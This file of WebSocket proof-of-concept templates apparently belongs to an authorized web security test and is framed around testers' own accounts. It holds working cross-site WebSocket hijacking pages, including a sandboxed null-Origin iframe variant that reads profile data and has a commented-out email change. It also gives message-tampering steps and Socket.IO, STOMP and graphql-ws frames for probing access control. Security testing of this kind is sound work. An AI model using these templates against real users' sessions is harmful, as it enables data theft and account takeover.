# WebSocket PoC Templates

Host on `localhost` or your own domain. Open in your own victim browser profile logged in to your own account.

## 1. CSWSH: read data and act cross-site

```html
<pre id="log"></pre>
<script>
const ws = new WebSocket("wss://TARGET/socket");          // cookies are sent automatically
ws.onopen = () => {
  ws.send('{"action":"get_profile"}');                    // read own data
  // ws.send('{"action":"update_email","email":"own-attacker@example.test"}');  // action (own victim only)
};
ws.onmessage = e => log.textContent += e.data + "\n";     // shown locally only
ws.onerror = e => log.textContent += "error (handshake rejected?)\n";
</script>
```

Works only if the server accepts the foreign Origin and the session cookie is sent (SameSite=None, or same-site attacker page). Note browser and cookie attributes.

## 2. null Origin variant

```html
<iframe sandbox="allow-scripts" srcdoc="<script>
const ws=new WebSocket('wss://TARGET/socket');
ws.onmessage=e=>parent.postMessage(e.data,'*');
ws.onopen=()=>ws.send('{&quot;action&quot;:&quot;get_profile&quot;}');
</script>"></iframe>
<pre id="log"></pre>
<script>addEventListener("message", e => log.textContent += e.data + "\n");</script>
```

## 3. Burp Repeater (WebSocket) message tampering

1. Proxy → WebSockets history → right-click a message → Send to Repeater.
2. Change fields: `userId`, `roomId`, `recipient`, `role`, `amount`, `isAdmin`.
3. Use "Reconnect" with a modified handshake (remove cookie, change Origin, change token) to test WSK-001/WSK-007/WSK-014.

## 4. Socket.IO framing

```
40                         # connect to default namespace
42["join",{"room":"ROOM_ID"}]
42["message",{"text":"MARKER"}]
```

Polling transport: `GET /socket.io/?EIO=4&transport=polling` then `POST /socket.io/?EIO=4&transport=polling&sid=SID` with body `42["join",{"room":"ROOM_ID"}]`.

## 5. STOMP framing (each frame ends with a NUL byte)

```
CONNECT
accept-version:1.2
host:TARGET

^@
SUBSCRIBE
id:sub-0
destination:/user/OTHER_OWN_ACCOUNT_ID/queue/notifications

^@
```

## 6. graphql-ws subscription

```json
{"type":"connection_init","payload":{"Authorization":"Bearer OWN_TOKEN"}}
{"id":"1","type":"subscribe","payload":{"query":"subscription { messageAdded(roomId: \"ROOM_ID\") { id text author { email } } }"}}
```

## Evidence

Handshake request/response (Origin, Cookie, status 101), frames sent and received (redacted), browser version for CSWSH, and the account IDs used for IDOR.
